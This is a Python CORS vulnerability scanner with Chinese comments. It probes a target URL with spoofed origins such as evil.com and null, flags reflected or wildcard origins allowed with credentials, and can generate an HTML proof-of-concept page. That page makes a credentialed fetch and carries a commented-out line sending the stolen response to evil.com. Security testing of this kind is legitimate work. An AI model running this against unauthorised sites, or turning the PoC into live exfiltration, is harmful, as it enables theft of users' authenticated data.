#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CORS漏洞扫描器
检测Web应用的跨域资源共享（CORS）配置是否存在安全漏洞
"""

import requests
import argparse
import sys
import json
from urllib.parse import urlparse
from tqdm import tqdm

requests.packages.urllib3.disable_warnings()

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

TIMEOUT = 10

TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "https://hacker.example.com",
    "https://example.com.evil.com",
    "http://evil.com",
    "null",
    "https://null",
    "https://www.attacker.com",
    "file://",
    "https://evil.com;",
]

TEST_HEADERS = [
    {"Origin": "https://evil.com"},
    {"Origin": "null"},
    {"Origin": "https://evil.com", "X-Forwarded-Host": "evil.com"},
    {"Origin": "https://evil.com", "X-Forwarded-For": "evil.com"},
]


def parse_cors_headers(response):
    """
    解析响应中的CORS相关头
    """
    headers = response.headers
    
    cors_info = {
        "ACAO": headers.get("Access-Control-Allow-Origin", None),
        "ACAC": headers.get("Access-Control-Allow-Credentials", None),
        "ACAM": headers.get("Access-Control-Allow-Methods", None),
        "ACAH": headers.get("Access-Control-Allow-Headers", None),
        "ACAE": headers.get("Access-Control-Expose-Headers", None),
        "ACMA": headers.get("Access-Control-Max-Age", None),
    }
    
    return cors_info


def is_vulnerable_reflection(origin, acao, acac):
    """
    判断是否存在危险的CORS配置
    """
    if acao is None:
        return False, None
    
    acao = acao.strip()
    
    if acao == "*":
        if acac and acac.lower() == "true":
            return True, "通配符*与Credentials同时启用，极其危险"
        else:
            return True, "允许任意源访问（*），但Credentials未启用"
    
    if acao == "null":
        return True, "允许null源访问，可能被沙箱环境利用"
    
    if origin and acao == origin:
        if acac and acac.lower() == "true":
            return True, "反射任意Origin且允许Credentials，存在凭据泄露风险"
        else:
            return True, "反射任意Origin，但Credentials未启用"
    
    if origin and origin in acao:
        return True, f"ACAO包含请求Origin前缀，可能存在匹配漏洞"
    
    return False, None


def check_origin_reflection(target_url, path="/"):
    """
    测试目标是否反射Origin
    """
    results = []
    
    url = target_url if target_url.endswith('/') else target_url + '/'
    if not path.startswith('/'):
        path = '/' + path
    test_url = urlparse(target_url)._replace(path=path).geturl()
    
    print(f"[*] 目标URL: {test_url}")
    print(f"[*] 开始CORS漏洞检测...\n")
    
    with tqdm(total=len(TEST_ORIGINS), desc="Origin测试进度", unit="test") as pbar:
        for origin in TEST_ORIGINS:
            headers = DEFAULT_HEADERS.copy()
            headers["Origin"] = origin
            
            try:
                response = requests.get(
                    test_url,
                    headers=headers,
                    timeout=TIMEOUT,
                    verify=False,
                    allow_redirects=False
                )
                
                cors_info = parse_cors_headers(response)
                
                if cors_info["ACAO"]:
                    vulnerable, reason = is_vulnerable_reflection(
                        origin,
                        cors_info["ACAO"],
                        cors_info["ACAC"]
                    )
                    
                    if vulnerable:
                        result = {
                            "test_origin": origin,
                            "aca_origin": cors_info["ACAO"],
                            "acac": cors_info["ACAC"],
                            "vulnerable": True,
                            "reason": reason,
                            "status_code": response.status_code,
                        }
                        results.append(result)
                        
                        tqdm.write(f"\n[+] 发现CORS漏洞!")
                        tqdm.write(f"    测试Origin: {origin}")
                        tqdm.write(f"    ACAO: {cors_info['ACAO']}")
                        tqdm.write(f"    ACAC: {cors_info['ACAC']}")
                        tqdm.write(f"    原因: {reason}")
            
            except requests.exceptions.RequestException as e:
                pass
            
            pbar.update(1)
    
    return results


def check_preflight(target_url, path="/"):
    """
    发送OPTIONS预检请求
    """
    url = target_url if target_url.endswith('/') else target_url + '/'
    if not path.startswith('/'):
        path = '/' + path
    test_url = urlparse(target_url)._replace(path=path).geturl()
    
    print(f"\n[*] 发送OPTIONS预检请求...")
    
    headers = DEFAULT_HEADERS.copy()
    headers["Origin"] = "https://evil.com"
    headers["Access-Control-Request-Method"] = "GET"
    headers["Access-Control-Request-Headers"] = "X-Custom-Header"
    
    try:
        response = requests.options(
            test_url,
            headers=headers,
            timeout=TIMEOUT,
            verify=False
        )
        
        cors_info = parse_cors_headers(response)
        
        print(f"  OPTIONS响应状态码: {response.status_code}")
        print(f"  Allow-Origin: {cors_info['ACAO']}")
        print(f"  Allow-Credentials: {cors_info['ACAC']}")
        print(f"  Allow-Methods: {cors_info['ACAM']}")
        print(f"  Allow-Headers: {cors_info['ACAH']}")
        print(f"  Expose-Headers: {cors_info['ACAE']}")
        print(f"  Max-Age: {cors_info['ACMA']}")
        
        if cors_info["ACAO"]:
            vulnerable, reason = is_vulnerable_reflection(
                "https://evil.com",
                cors_info["ACAO"],
                cors_info["ACAC"]
            )
            if vulnerable:
                print(f"  ❌ 漏洞: {reason}")
        
        return cors_info
        
    except requests.exceptions.RequestException as e:
        print(f"  [!] OPTIONS请求失败: {e}")
        return None


def generate_poc(target_url, result):
    """
    生成CORS漏洞利用POC
    """
    origin = result['test_origin']
    
    poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>CORS POC</title>
</head>
<body>
    <h2>CORS漏洞验证</h2>
    <p>目标: {target_url}</p>
    <p>测试Origin: {origin}</p>
    <p>ACAO: {result['aca_origin']}</p>
    <p>ACAC: {result['acac']}</p>
    <p>原因: {result['reason']}</p>
    <script>
        fetch('{target_url}', {{
            credentials: 'include'
        }})
        .then(response => response.text())
        .then(data => {{
            document.write('<pre>' + data + '</pre>');
            // 或者发送到攻击者服务器
            // fetch('https://evil.com/steal?data=' + encodeURIComponent(data));
        }})
        .catch(err => {{
            document.write('Error: ' + err);
        }});
    </script>
</body>
</html>"""
    
    return poc


def main():
    parser = argparse.ArgumentParser(
        description="CORS漏洞扫描器 - 检测跨域资源共享配置漏洞",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python scanner.py -u "https://test.com/api/data"
  python scanner.py -u "https://test.com" -p "/api/user"
  python scanner.py -u "https://test.com/api/data" --poc
  python scanner.py -u "https://test.com/api/data" -o result.txt
        """
    )
    
    parser.add_argument("-u", "--url", required=True,
                        help="目标URL")
    parser.add_argument("-p", "--path", default="/",
                        help="测试路径（默认: /）")
    parser.add_argument("-o", "--output",
                        help="结果输出文件路径")
    parser.add_argument("--poc", action="store_true",
                        help="生成CORS漏洞利用POC")
    parser.add_argument("--preflight", action="store_true",
                        help="发送OPTIONS预检请求")
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("CORS漏洞扫描器")
    print("=" * 50)
    print(f"[*] 目标: {args.url}")
    print(f"[*] 路径: {args.path}")
    print()
    
    results = check_origin_reflection(args.url, args.path)
    
    if args.preflight:
        preflight_info = check_preflight(args.url, args.path)
    
    print(f"\n{'=' * 50}")
    if results:
        print(f"[+] 扫描完成！发现 {len(results)} 个CORS配置漏洞")
        print("=" * 50)
        
        for i, result in enumerate(results, 1):
            print(f"\n--- 漏洞 {i} ---")
            print(f"测试Origin: {result['test_origin']}")
            print(f"ACAO: {result['aca_origin']}")
            print(f"ACAC: {result['acac']}")
            print(f"HTTP状态码: {result['status_code']}")
            print(f"原因: {result['reason']}")
        
        if args.poc:
            print(f"\n{'=' * 50}")
            print("[*] 生成POC HTML代码:")
            print("=" * 50)
            for result in results:
                poc = generate_poc(args.url, result)
                print(f"\n{'-' * 40}")
                print(poc)
    else:
        print("[-] 未发现CORS漏洞")
        print("=" * 50)
    
    if args.output and results:
        with open(args.output, 'w', encoding='utf-8') as f:
            for result in results:
                f.write(f"测试Origin: {result['test_origin']}\n")
                f.write(f"ACAO: {result['aca_origin']}\n")
                f.write(f"ACAC: {result['acac']}\n")
                f.write(f"原因: {result['reason']}\n\n")
        print(f"\n[+] 结果已保存到: {args.output}")
    
    if not results:
        print("\n[*] 提示：")
        print("    1. CORS漏洞常见于API接口，尝试指定路径: -p /api/user")
        print("    2. 部分应用只在特定路径设置CORS，可配合目录扫描器发现更多接口")
        print("    3. 使用 --preflight 参数可以查看OPTIONS响应头信息")


if __name__ == "__main__":
    main()